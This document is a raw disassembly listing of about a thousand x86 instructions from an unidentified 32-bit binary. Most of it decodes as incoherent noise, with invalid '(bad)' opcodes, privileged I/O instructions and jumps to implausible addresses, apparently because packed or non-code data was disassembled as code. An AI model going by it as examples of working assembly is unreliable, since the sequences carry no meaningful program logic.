  41cadc:	or     ecx,DWORD PTR [ecx+0x38]
  41cadf:	pop    esp
  41cae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae1:	pop    ebx
  41cae2:	sti    
  41cae3:	test   DWORD PTR [edx-0x4d98afae],edx
  41cae9:	xor    BYTE PTR ds:0xc92147db,0x52
  41caf0:	push   esp
  41caf1:	pop    eax
  41caf2:	ficomp WORD PTR [edi-0x3d]
  41caf5:	push   ds
  41caf6:	pop    eax
  41caf7:	cld    
  41caf8:	popa   
  41caf9:	hlt    
  41cafa:	add    ebx,DWORD PTR [edx+0x1840895c]
  41cb00:	popf   
  41cb01:	adc    ebp,DWORD PTR [edi]
  41cb03:	xor    DWORD PTR [ecx+0x45],0x75
  41cb07:	xchg   ebx,eax
  41cb08:	push   ss
  41cb09:	lods   eax,DWORD PTR ds:[esi]
  41cb0a:	pop    ebx
  41cb0b:	push   0xd30cbafb
  41cb10:	rcr    bl,0x57
  41cb13:	cmp    BYTE PTR [ecx+0x2f],0x5b
  41cb17:	pop    esp
  41cb18:	mov    fs,WORD PTR [esi]
  41cb1a:	gs adc al,0xa
  41cb1d:	mov    ds:0xa6f2e445,eax
  41cb22:	xchg   esi,eax
  41cb23:	inc    ebx
  41cb24:	lods   eax,DWORD PTR ds:[esi]
  41cb25:	xchg   ecx,eax
  41cb26:	and    BYTE PTR [esi+0xe],0xf0
  41cb2a:	and    BYTE PTR [edx],0xa4
  41cb2d:	or     ebx,DWORD PTR [esi+0x41]
  41cb30:	mov    DWORD PTR [eax+0x13],eax
  41cb33:	push   ecx
  41cb34:	scas   eax,DWORD PTR es:[edi]
  41cb35:	cs repnz xor eax,0xbf275d1a
  41cb3c:	rol    DWORD PTR [edi+0x2fda5610],cl
  41cb42:	std    
  41cb43:	fld    st(7)
  41cb45:	cmp    BYTE PTR [esi+ebp*1],dl
  41cb48:	fsubr  st,st(1)
  41cb4a:	fsubr  st,st(2)
  41cb4c:	in     eax,dx
  41cb4d:	cdq    
  41cb4e:	jns    0x41cb91
  41cb50:	jbe    0x41cba9
  41cb52:	and    cl,BYTE PTR [edi]
  41cb54:	pushf  
  41cb55:	mov    al,ds:0x1cb55c04
  41cb5a:	inc    edi
  41cb5b:	mov    cl,0x32
  41cb5d:	sub    eax,edi
  41cb5f:	rcr    BYTE PTR [esi],1
  41cb61:	fisubr WORD PTR [ebp+0x7da032be]
  41cb67:	es cmp al,ah
  41cb6a:	shl    esi,1
  41cb6c:	popf   
  41cb6d:	loopne 0x41cb29
  41cb6f:	and    al,0x79
  41cb71:	div    BYTE PTR [ebp+0x622564df]
  41cb77:	loopne 0x41cb8f
  41cb79:	sub    edx,DWORD PTR [edx+edx*1-0x52af5e6a]
  41cb80:	xchg   BYTE PTR [esi-0x7e98439b],al
  41cb86:	cmp    al,0xe5
  41cb88:	sbb    esi,DWORD PTR [edx+ecx*2]
  41cb8b:	or     DWORD PTR ss:[edi+0x5164],esp
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xfdf91922
  41cc03:	push   ebp
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	pop    esp
  41cc0d:	jge    0x41cb99
  41cc0f:	jb     0x41cc1b
  41cc11:	mov    DWORD PTR [ecx+0x5485985c],edi
  41cc17:	push   ss
  41cc18:	adc    eax,0xc6d5448
  41cc1d:	(bad)  
  41cc1e:	pop    ebp
  41cc1f:	adc    al,0x34
  41cc21:	lds    eax,FWORD PTR [ecx-0x6d7eabb9]
  41cc27:	mov    edx,0x213f9d85
  41cc2c:	dec    ch
  41cc2e:	dec    edi
  41cc2f:	std    
  41cc30:	stos   DWORD PTR es:[edi],eax
  41cc31:	or     edx,DWORD PTR [edx]
  41cc33:	je     0x41cbb8
  41cc35:	jmp    0x59fe572a
  41cc3a:	sub    al,0xe9
  41cc3c:	in     eax,0x8e
  41cc3e:	mov    ah,0x42
  41cc40:	xlat   BYTE PTR ds:[ebx]
  41cc41:	jno    0x41cc62
  41cc43:	mov    dl,0x71
  41cc45:	retf   
  41cc46:	pop    ss
  41cc47:	mov    eax,ds:0x4ee29d7b
  41cc4c:	xlat   BYTE PTR ds:[ebx]
  41cc4d:	mov    ebp,0x9e1385c7
  41cc52:	and    DWORD PTR [edx],ecx
  41cc54:	scas   al,BYTE PTR es:[edi]
  41cc55:	test   BYTE PTR ss:0x4c2d25c,bh
  41cc5c:	push   esp
  41cc5d:	out    0xc9,al
  41cc5f:	clc    
  41cc60:	mov    ebx,0x1a09b7b8
  41cc65:	repnz sbb DWORD PTR ss:[esi],esp
  41cc69:	add    al,0xd
  41cc6b:	cwde   
  41cc6c:	pop    edx
  41cc6d:	fsub   QWORD PTR [ebx+edx*1]
  41cc70:	pop    ebp
  41cc71:	xor    dl,dh
  41cc73:	cmp    esp,DWORD PTR [ebx-0x5054710a]
  41cc79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc7a:	sbb    al,0x31
  41cc7c:	add    ch,bl
  41cc7e:	cwde   
  41cc7f:	mov    cl,0xaa
  41cc81:	push   cs
  41cc82:	cmp    al,BYTE PTR [esi-0x725e92b0]
  41cc88:	outs   dx,DWORD PTR ds:[esi]
  41cc89:	push   edi
  41cc8a:	and    ecx,ebp
  41cc8c:	retf   0x4348
  41cc8f:	pop    ebp
  41cc90:	dec    ebx
  41cc91:	pop    es
  41cc92:	xchg   ebp,eax
  41cc93:	icebp  
  41cc94:	rcl    BYTE PTR [ebx+eax*4-0x19],1
  41cc98:	ds sahf 
  41cc9a:	(bad)  
  41cc9b:	int3   
  41cc9c:	push   ss
  41cc9d:	sbb    al,ch
  41cc9f:	mov    gs,WORD PTR [edi]
  41cca1:	out    0x33,eax
  41cca3:	(bad)  
  41cca4:	xchg   ebp,eax
  41cca5:	shl    BYTE PTR [edi+0x4798a57a],1
  41ccab:	sub    eax,0xf3a828f5
  41ccb0:	js     0x41cc46
  41ccb2:	push   ecx
  41ccb3:	or     edx,edi
  41ccb5:	dec    ecx
  41ccb6:	rcl    DWORD PTR [ebp+0x61],0xa1
  41ccba:	inc    ebp
  41ccbb:	stc    
  41ccbc:	xor    esp,DWORD PTR [ebp+eiz*4-0x23cf2e72]
  41ccc3:	or     esp,DWORD PTR [ebx]
  41ccc5:	xlat   BYTE PTR ds:[ebx]
  41ccc6:	jnp    0x41cc83
  41ccc8:	sub    BYTE PTR [ecx+edx*1+0x2811b64],0xb1
  41ccd0:	pop    edx
  41ccd1:	pop    eax
  41ccd2:	xchg   esp,eax
  41ccd3:	adc    bh,dh
  41ccd5:	je     0x41ccd7
  41ccd7:	or     BYTE PTR [ecx+0x41],cl
  41ccda:	cmp    al,0xa7
  41ccdc:	stos   DWORD PTR es:[edi],eax
  41ccdd:	mov    ds:0xb1bc0371,al
  41cce2:	addr16 xchg esi,eax
  41cce4:	pop    edx
  41cce5:	cs dec ecx
  41cce7:	mov    edi,0xb119b104
  41ccec:	(bad)  
  41cced:	int3   
  41ccee:	mov    ecx,0x3aef76f5
  41ccf3:	and    DWORD PTR [esi],eax
  41ccf5:	sub    BYTE PTR [ebx+ebp*8-0x35],cl
  41ccf9:	dec    edi
  41ccfa:	in     eax,0x17
  41ccfc:	ins    DWORD PTR es:[edi],dx
  41ccfd:	pop    esi
  41ccfe:	and    ebx,DWORD PTR [ebx+0x36]
  41cd01:	mov    ds:0x63d4d051,al
  41cd06:	cld    
  41cd07:	test   al,0xb2
  41cd09:	lock pop ds
  41cd0b:	fistp  WORD PTR [ebp+0x60]
  41cd0e:	add    eax,0x12
	...
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	rcl    BYTE PTR [esi],0xd5
  41cd83:	fstp   DWORD PTR [eax+0x32]
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	fst    QWORD PTR [edx-0x1a]
  41cd8f:	nop
  41cd90:	sbb    dh,bh
  41cd92:	mov    BYTE PTR [ecx],ch
  41cd94:	jp     0x41cddb
  41cd96:	push   cs
  41cd97:	outs   dx,DWORD PTR ds:[esi]
  41cd98:	lods   eax,DWORD PTR ds:[esi]
  41cd9a:	daa    
  41cd9b:	hlt    
  41cd9c:	dec    esi
  41cd9d:	xor    eax,0xa8dbc7ba
  41cda2:	pop    ebx
  41cda3:	or     eax,0x42077a5
  41cda8:	add    bl,BYTE PTR [eax+0x1789a02e]
  41cdae:	cmp    bl,ah
  41cdb0:	shl    DWORD PTR [esi+0x7190dff7],cl
  41cdb6:	rcr    BYTE PTR [ecx+0x78],0x9a
  41cdba:	fwait
  41cdbb:	adc    edi,DWORD PTR [ecx]
  41cdbd:	or     DWORD PTR [edi-0x19],ebp
  41cdc0:	dec    esi
  41cdc1:	and    eax,0x79c308f5
  41cdc6:	or     ch,BYTE PTR [ebx-0x1322387]
  41cdcc:	shr    esi,0x16
  41cdcf:	ror    DWORD PTR [eax+0x98ecad4],cl
  41cdd5:	aas    
  41cdd6:	retf   
  41cdd7:	je     0x41cdce
  41cdd9:	sub    al,0x49
  41cddb:	cdq    
  41cddc:	push   ds
  41cddd:	add    eax,0xbd5f3f82
  41cde2:	xchg   DWORD PTR [ebx],ecx
  41cde4:	mul    DWORD PTR [ebp-0x53]
  41cde7:	sbb    esi,eax
  41cde9:	addr16 int 0xd0
  41cdec:	cwde   
  41cded:	cs inc eax
  41cdef:	into   
  41cdf0:	test   eax,0x3f1b22aa
  41cdf5:	push   ebp
  41cdf6:	and    edx,DWORD PTR [esi+0x7522b1e7]
  41cdfc:	push   edx
  41cdfd:	jg     0x41cd81
  41cdff:	cwde   
  41ce00:	sbb    BYTE PTR [esi-0x2],dl
  41ce03:	jmp    0x41ce25
  41ce05:	jns    0x41ce34
  41ce07:	sti    
  41ce08:	sbb    al,0x7
  41ce0a:	push   0xffffff9d
  41ce0c:	mov    ds:0x2c3deb36,al
  41ce11:	or     al,0xa5
  41ce13:	mov    ds:0x394f6e64,eax
  41ce18:	jnp    0x41ce76
  41ce1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce1b:	and    edx,DWORD PTR [ebx]
  41ce1d:	mov    ecx,0x29e21a58
  41ce22:	data16 arpl WORD PTR ds:0x2ca414d6,cx
  41ce29:	test   al,0x88
  41ce2b:	jb     0x41ce90
  41ce2d:	enter  0xcf88,0xf9
  41ce31:	(bad)  
  41ce32:	cmc    
  41ce33:	inc    eax
  41ce34:	in     al,dx
  41ce35:	inc    eax
  41ce36:	clc    
  41ce37:	sub    BYTE PTR [edi+0x11],0x59
  41ce3b:	fistp  WORD PTR [ebp*2-0x56e29fc2]
  41ce42:	mov    ebp,0x3781de06
  41ce47:	mov    dh,0x70
  41ce49:	fcmovb st,st(7)
  41ce4b:	push   ecx
  41ce4c:	cs sub al,0x55
  41ce4f:	lds    ebp,FWORD PTR [esi]
  41ce51:	out    0x66,eax
  41ce53:	shl    DWORD PTR [eiz*8+0x24285cba],cl
  41ce5a:	mov    bh,0x58
  41ce5c:	cdq    
  41ce5d:	cmp    eax,0x78873629
  41ce62:	(bad)  
  41ce63:	mov    eax,0xa30530d4
  41ce68:	pushf  
  41ce69:	sub    eax,DWORD PTR [esi]
  41ce6b:	call   0x229aafd4
  41ce70:	xchg   esp,eax
  41ce71:	fisttp QWORD PTR [ecx-0x72]
  41ce74:	scas   eax,DWORD PTR es:[edi]
  41ce75:	(bad)  
  41ce76:	call   0x2420cc3f
  41ce7b:	loop   0x41ceb1
  41ce7d:	pop    eax
  41ce7e:	adc    DWORD PTR [edx-0x3b],edi
  41ce81:	inc    esp
  41ce82:	mov    cl,0x64
  41ce84:	dec    esp
  41ce85:	dec    eax
  41ce86:	push   0x4a760d09
  41ce8b:	xchg   ecx,eax
  41ce8c:	mov    ds:0x3cf9b8,al
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	adc    al,0x8
  41cf02:	push   esp
  41cf03:	pop    ebp
  41cf04:	pop    esp
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	xchg   BYTE PTR [ecx-0x69],ch
  41cf0f:	xlat   BYTE PTR ds:[ebx]
  41cf10:	push   edx
  41cf11:	lock ja 0x41cf07
  41cf14:	dec    esi
  41cf15:	cmp    esp,DWORD PTR [edx+0x7a33aee3]
  41cf1b:	sub    al,0x53
  41cf1d:	ss dec esi
  41cf1f:	shr    BYTE PTR [ecx],cl
  41cf21:	push   0xf8ee620c
  41cf26:	pusha  
  41cf27:	dec    esp
  41cf28:	lods   al,BYTE PTR ds:[esi]
  41cf29:	(bad)  
  41cf2a:	(bad)  
  41cf2b:	sar    eax,1
  41cf2d:	call   DWORD PTR [esp+edx*1]
  41cf30:	push   es
  41cf31:	inc    ecx
  41cf32:	rol    DWORD PTR [ebp+0x12],0xb2
  41cf36:	cwde   
  41cf37:	scas   eax,DWORD PTR es:[edi]
  41cf38:	add    eax,0x2d088678
  41cf3d:	add    cl,BYTE PTR [ebx]
  41cf3f:	sbb    DWORD PTR [esi+0x27],esp
  41cf42:	xor    eax,0xa9ce3c29
  41cf47:	mov    dh,0x54
  41cf49:	leave  
  41cf4a:	jnp    0x41cf6b
  41cf4c:	cli    
  41cf4d:	jmp    0xf818:0x3b680e9
  41cf54:	ret    
  41cf55:	rep ins DWORD PTR es:[edi],dx
  41cf57:	in     eax,dx
  41cf58:	data16 clc 
  41cf5a:	add    al,0x54
  41cf5c:	gs jo  0x41cf6e
  41cf5f:	pop    eax
  41cf60:	mov    DWORD PTR [ebp+eiz*8-0x398c045],ebx
  41cf67:	neg    BYTE PTR [ebx]
  41cf69:	ins    BYTE PTR es:[edi],dx
  41cf6a:	repnz mov al,gs:0xbf3b2e59
  41cf71:	rcr    DWORD PTR [eax+eiz*2+0x1bd60d30],cl
  41cf78:	mov    ebp,0xe8f4489
  41cf7d:	sti    
  41cf7e:	mov    BYTE PTR [esi+0x63c0735c],ch
  41cf84:	dec    edi
  41cf85:	sbb    eax,0x9e11ab98
  41cf8a:	mov    ebx,0x9a8d8312
  41cf8f:	inc    esp
  41cf90:	xchg   BYTE PTR [ebx+ebx*4+0x34],cl
  41cf94:	(bad)  
  41cf96:	lock dec ebx
  41cf98:	lahf   
  41cf99:	xchg   ebp,eax
  41cf9a:	sahf   
  41cf9b:	imul   esi,DWORD PTR [ebx+0x268b6c9a],0x9f7fd564
  41cfa5:	inc    eax
  41cfa6:	cmp    BYTE PTR [ecx],dh
  41cfa8:	idiv   DWORD PTR [esi+0x35]
  41cfab:	and    edi,DWORD PTR [ecx]
  41cfad:	retf   0x9de3
  41cfb0:	out    0x6d,eax
  41cfb2:	pop    edx
  41cfb3:	jae    0x41d01e
  41cfb5:	jle    0x41cffc
  41cfb7:	mov    al,0x24
  41cfb9:	adc    eax,0xad777817
  41cfbe:	icebp  
  41cfbf:	adc    cl,BYTE PTR [esp+ebp*8+0x1a]
  41cfc3:	adc    eax,0x3145a6d9
  41cfc8:	scas   eax,DWORD PTR es:[edi]
  41cfc9:	jl     0x41cfce
  41cfcb:	test   al,0x2f
  41cfcd:	jb     0x41cfd0
  41cfcf:	scas   al,BYTE PTR es:[edi]
  41cfd0:	mov    BYTE PTR [ecx+0x6c],ch
  41cfd3:	(bad)  
  41cfd4:	or     al,0xe6
  41cfd6:	add    DWORD PTR [ebx+0x72],eax
  41cfd9:	adc    ah,al
  41cfdb:	pop    edi
  41cfdc:	dec    ebx
  41cfdd:	add    esi,DWORD PTR ds:[ebx]
  41cfe0:	fild   WORD PTR [eax-0x13895591]
  41cfe6:	adc    eax,DWORD PTR [eax]
  41cfe8:	or     eax,0x56ca1075
  41cfed:	xor    edi,DWORD PTR [edi+0x13722f4f]
  41cff3:	jl     0x41d02d
  41cff5:	retf   
  41cff6:	sub    DWORD PTR [edi-0x7db634ae],ecx
  41cffc:	dec    ebp
  41cffd:	into   
  41cffe:	mov    al,ds:0x34aaeb59
  41d003:	stos   DWORD PTR es:[edi],eax
  41d004:	sub    eax,0xa199ccdc
  41d009:	jge    0x41cfda
  41d00b:	jbe    0x41cf90
  41d00d:	mov    eax,0x26c
	...
  41d072:	add    BYTE PTR [eax],al
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x4f2a7bbd
  41d083:	pop    esp
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	rcr    BYTE PTR [eax-0x5a],cl
  41d08f:	(bad)  
  41d090:	or     dl,BYTE PTR [ecx-0x473cc51f]
  41d096:	sub    DWORD PTR [ecx-0x12b7e85e],esp
  41d09c:	fdivr  st,st(3)
  41d09e:	loop   0x41d0ed
  41d0a0:	das    
  41d0a1:	push   ebx
  41d0a2:	push   ecx
  41d0a3:	and    al,0xbb
  41d0a5:	imul   esi,DWORD PTR [ebp+0x55],0x32
  41d0a9:	xor    DWORD PTR cs:[esi],esp
  41d0ac:	stos   BYTE PTR es:[edi],al
  41d0ad:	and    cl,BYTE PTR [eax+0x7e]
  41d0b0:	jne    0x41d093
  41d0b2:	out    0xe4,al
  41d0b4:	stc    
  41d0b5:	mov    ds:0xd19d2f75,eax
  41d0ba:	xor    edi,ebp
  41d0bc:	fnstenv [ebp+0x62]
  41d0bf:	cmp    al,0x75
  41d0c1:	push   edi
  41d0c2:	test   DWORD PTR [esi-0x47ff5f22],ebx
  41d0c8:	xchg   esi,eax
  41d0c9:	xchg   ebp,eax
  41d0ca:	xchg   ebp,eax
  41d0cb:	mov    ch,BYTE PTR [ebx+0x49]
  41d0ce:	push   ebx
  41d0cf:	enter  0x5566,0x9b
  41d0d3:	mov    esp,DWORD PTR [esi]
  41d0d5:	pop    ecx
  41d0d6:	xchg   esp,eax
  41d0d7:	adc    DWORD PTR [ecx-0x57],0x2f
  41d0db:	xchg   edi,eax
  41d0dc:	adc    ch,dh
  41d0de:	(bad)  
  41d0df:	jmp    0xef33:0xa2a8b70b
  41d0e6:	dec    esi
  41d0e7:	int    0xb2
  41d0e9:	cmc    
  41d0ea:	cli    
  41d0eb:	add    al,0xed
  41d0ed:	ret    
  41d0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0ef:	add    ah,BYTE PTR [edx+0x48]
  41d0f2:	and    bl,BYTE PTR [ecx]
  41d0f4:	cmp    DWORD PTR [ebx-0x37f9e5b1],esi
  41d0fa:	lahf   
  41d0fb:	retf   0x2c4a
  41d0fe:	loop   0x41d151
  41d100:	adc    al,0x8d
  41d102:	inc    DWORD PTR [ecx+0x3aa26c3d]
  41d108:	iret   
  41d109:	les    ebx,FWORD PTR [ebp-0x5b]
  41d10c:	in     eax,0xc8
  41d10e:	int    0x6e
  41d110:	stc    
  41d111:	or     bh,BYTE PTR [ecx+0x1d]
  41d114:	outs   dx,DWORD PTR ds:[esi]
  41d115:	inc    edi
  41d116:	sub    edi,esi
  41d118:	jo     0x41d142
  41d11a:	ins    BYTE PTR es:[edi],dx
  41d11b:	jmp    0x41d120
  41d11d:	sbb    eax,DWORD PTR [edi+0x74]
  41d120:	cs jg  0x41d0c8
  41d123:	icebp  
  41d124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d125:	call   0x3dfd:0xcc8f7774
  41d12c:	popa   
  41d12d:	adc    DWORD PTR [edx+edi*2-0x52ad546f],0x75
  41d135:	cmc    
  41d136:	(bad)  
  41d137:	jo     0x41d0be
  41d139:	scas   al,BYTE PTR es:[edi]
  41d13a:	das    
  41d13b:	loopne 0x41d0dc
  41d13d:	jle    0x41d12f
  41d13f:	das    
  41d140:	repz and eax,0xaae5acfd
  41d146:	sub    eax,0x19793277
  41d14b:	nop
  41d14c:	adc    DWORD PTR [edx],esp
  41d14e:	mov    esi,0x9b6609fc
  41d153:	fs out 0x9c,al
  41d156:	mov    edx,0x7fa5edd1
  41d15b:	scas   eax,DWORD PTR es:[edi]
  41d15c:	imul   edi,DWORD PTR [ebp+0x2d49d88],0xffffffdf
  41d163:	neg    BYTE PTR ds:0x2d5e4b2d
  41d169:	or     eax,0xa5add8a8
  41d16e:	xchg   ebp,eax
  41d16f:	mov    bl,0x84
  41d171:	cdq    
  41d172:	leave  
  41d173:	push   eax
  41d174:	jbe    0x41d168
  41d176:	and    BYTE PTR ds:0x61a52160,dl
  41d17c:	xor    esi,DWORD PTR [ebp+0x7c996907]
  41d182:	dec    ebx
  41d183:	nop
  41d184:	sti    
  41d185:	jae    0x41d1bf
  41d187:	cmp    eax,DWORD PTR [edx-0x70e7030c]
  41d18d:	and    al,0x40
  41d18f:	mov    dl,0x0
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	adc    cl,ah
  41d202:	cmc    
  41d203:	sub    esp,DWORD PTR [ebp+esi*1+0x1]
  41d207:	add    BYTE PTR [ecx+eax*1],al
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	sub    DWORD PTR [edi+eiz*2-0x70a7406],ebx
  41d213:	mov    dh,0xd1
  41d215:	gs xchg edi,eax
  41d217:	and    dl,BYTE PTR [ebp+eax*2-0x9]
  41d21b:	mov    ds:0x7b125f1e,eax
  41d220:	aad    0xa8
  41d222:	push   ebp
  41d223:	fs hlt 
  41d225:	jle    0x41d21d
  41d227:	retf   
  41d228:	cdq    
  41d229:	jb     0x41d240
  41d22b:	out    dx,al
  41d22c:	mov    dl,0x51
  41d22e:	cmp    BYTE PTR [eax],bl
  41d230:	xchg   DWORD PTR [edx-0x7677a316],ebp
  41d236:	dec    eax
  41d237:	mov    ds:0x78a3e588,eax
  41d23c:	les    eax,FWORD PTR [edx-0x443d418]
  41d242:	pop    edx
  41d243:	sub    dh,BYTE PTR [edi+0x7d]
  41d246:	push   esp
  41d247:	mov    cl,0xf9
  41d249:	or     DWORD PTR [edi-0x9876d9d],edi
  41d24f:	in     al,0xe0
  41d251:	ss pop edx
  41d253:	push   edi
  41d254:	and    ebp,esi
  41d256:	cdq    
  41d257:	pop    es
  41d258:	inc    ebp
  41d259:	iret   
  41d25a:	inc    esp
  41d25b:	jecxz  0x41d1e5
  41d25d:	rcl    DWORD PTR [ecx-0x4b],cl
  41d260:	imul   esp,DWORD PTR fs:[ecx],0x9cb88e99
  41d267:	add    al,0x7c
  41d269:	pop    esp
  41d26a:	inc    DWORD PTR [ecx+edx*2+0x36]
  41d26e:	cmc    
  41d26f:	and    ch,BYTE PTR [ebx-0x7ff0fff3]
  41d275:	inc    edx
  41d276:	ret    0x499c
  41d279:	pop    esi
  41d27a:	mov    bl,0xa5
  41d27c:	in     eax,0x1e
  41d27e:	out    0x91,al
  41d280:	xchg   dl,bl
  41d282:	dec    DWORD PTR [edi-0x52]
  41d285:	test   eax,0x32a93b2b
  41d28a:	and    eax,0xefd893ae
  41d28f:	test   DWORD PTR [eax],ebx
  41d291:	add    dl,BYTE PTR [ebp-0x48]
  41d294:	push   esp
  41d295:	or     al,0x18
  41d297:	jp     0x41d2df
  41d299:	loop   0x41d267
  41d29b:	mov    ah,0xaa
  41d29d:	xchg   edx,eax
  41d29e:	adc    cl,ah
  41d2a0:	mov    bl,BYTE PTR [eax+0x442faf96]
  41d2a6:	mov    ds:0x4c74bfd7,al
  41d2ab:	and    al,0x66
  41d2ad:	test   DWORD PTR [edi],esi
  41d2af:	jno    0x41d323
  41d2b1:	or     DWORD PTR [ecx],esi
  41d2b3:	pop    esp
  41d2b4:	mov    bl,0xa9
  41d2b6:	stos   DWORD PTR es:[edi],eax
  41d2b7:	icebp  
  41d2b8:	cli    
  41d2b9:	mov    ebx,0x7a4f535f
  41d2be:	mov    al,ds:0x25d8b30f
  41d2c3:	and    al,0x39
  41d2c5:	test   al,0x8b
  41d2c7:	mov    al,0x21
  41d2c9:	cli    
  41d2ca:	sub    ah,al
  41d2cc:	push   0x79
  41d2ce:	leave  
  41d2cf:	addr16 hlt 
  41d2d1:	xor    DWORD PTR [ecx+0x37],esp
  41d2d4:	adc    eax,0x21475af9
  41d2d9:	adc    cl,al
  41d2db:	jmp    0xfda0b31a
  41d2e0:	jne    0x41d304
  41d2e2:	fdivr  st,st(7)
  41d2e4:	clc    
  41d2e5:	jo     0x41d305
  41d2e7:	push   ds
  41d2e8:	jmp    0xfbc6:0x4f5c2618
  41d2ef:	imul   edx,DWORD PTR [ecx],0x674277e6
  41d2f5:	sub    eax,0x62a422c6
  41d2fa:	xchg   esp,eax
  41d2fb:	inc    esi
  41d2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2fd:	sub    BYTE PTR [edx],bh
  41d2ff:	mov    eax,0xfa227e7c
  41d304:	cmp    al,0xe
  41d306:	and    al,BYTE PTR [ebp+0x15f1fb8b]
  41d30c:	lea    edi,[ebp+0x26bd]
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	or     al,0x8e
  41d382:	or     BYTE PTR [edi+0x68],cl
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    al,0x1
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	sbb    dl,BYTE PTR [ebp-0x4c]
  41d38f:	push   ss
  41d390:	aas    
  41d391:	out    dx,al
  41d392:	xchg   BYTE PTR [edx],bl
  41d394:	rcr    BYTE PTR [edi],1
  41d396:	mov    BYTE PTR [esi+0x25],dh
  41d399:	inc    ebx
  41d39a:	add    ebx,edi
  41d39c:	mov    edi,0xc5454592
  41d3a1:	icebp  
  41d3a2:	xor    esp,DWORD PTR [ecx-0x78]
  41d3a5:	je     0x41d3a4
  41d3a7:	dec    ebx
  41d3a8:	ss call 0xdb7dca26
  41d3ae:	sbb    BYTE PTR [ebx-0x48aa3aab],al
  41d3b4:	push   ss
  41d3b5:	push   edi
  41d3b6:	mov    WORD PTR ds:0x642937c6,?
  41d3bc:	test   BYTE PTR [ecx],cl
  41d3be:	cmp    BYTE PTR [ebp+0x15],al
  41d3c1:	imul   edx,DWORD PTR [ecx+0x24],0xffffff98
  41d3c5:	jle    0x9fc99349
  41d3cb:	xlat   BYTE PTR ds:[ebx]
  41d3cc:	clc    
  41d3cd:	ds cmp al,0x1b
  41d3d0:	pushf  
  41d3d1:	xor    eax,0x14793ddb
  41d3d6:	aas    
  41d3d7:	fimul  WORD PTR [ebp+0x1eb3aa7a]
  41d3dd:	lock fcomp st(5)
  41d3e0:	push   ebp
  41d3e1:	ds jge 0x41d3ec
  41d3e4:	fcomp  DWORD PTR [edi-0x16]
  41d3e7:	test   eax,0x250fcba5
  41d3ec:	rol    BYTE PTR [ebx-0x1f],0x86
  41d3f0:	dec    eax
  41d3f1:	adc    BYTE PTR [edi],al
  41d3f3:	call   0x804d:0x694f1fde
  41d3fa:	(bad)  
  41d3fb:	pop    ds
  41d3fc:	dec    ebp
  41d3fd:	imul   edx,DWORD PTR [eax],0xb59100f6
  41d403:	xchg   ebp,eax
  41d404:	popa   
  41d405:	adc    edx,DWORD PTR [edi]
  41d407:	dec    esp
  41d408:	mov    esp,0x5c808fd9
  41d40d:	or     ax,0xd60d
  41d411:	push   ebp
  41d412:	pop    ds
  41d413:	or     BYTE PTR [ebx+0x6894b0c9],ah
  41d419:	mov    al,ds:0xe2598c6
  41d41e:	mov    BYTE PTR [ebp-0x5160db80],dh
  41d424:	je     0x41d40b
  41d426:	sub    eax,0x743484c2
  41d42b:	and    eax,ebx
  41d42d:	add    eax,0xa0463d77
  41d432:	in     al,0x1b
  41d434:	(bad)  
  41d436:	call   0x24a04499
  41d43b:	loopne 0x41d3d4
  41d43d:	push   es
  41d43e:	aaa    
  41d43f:	xchg   edx,eax
  41d440:	call   0x87193143
  41d445:	bound  esi,QWORD PTR [edi-0x706ddaba]
  41d44b:	fcmovbe st,st(0)
  41d44d:	push   edi
  41d44e:	aas    
  41d44f:	push   edx
  41d450:	jno    0x41d3dc
  41d452:	repnz pop eax
  41d454:	jne    0x41d440
  41d456:	adc    BYTE PTR [eax+0x2f3988a2],dl
  41d45c:	data16 mov BYTE PTR [eax-0x53],bh
  41d460:	dec    ecx
  41d461:	xchg   DWORD PTR [esp+eiz*2],edx
  41d464:	aaa    
  41d465:	pop    ebx
  41d466:	fistp  QWORD PTR [esi-0x1d044379]
  41d46c:	shl    BYTE PTR [esi],cl
  41d46e:	mov    ebp,0x5179b7ec
  41d473:	add    esi,ebp
  41d475:	mov    cl,0x5a
  41d477:	aaa    
  41d478:	repnz mov esi,0xee2e362f
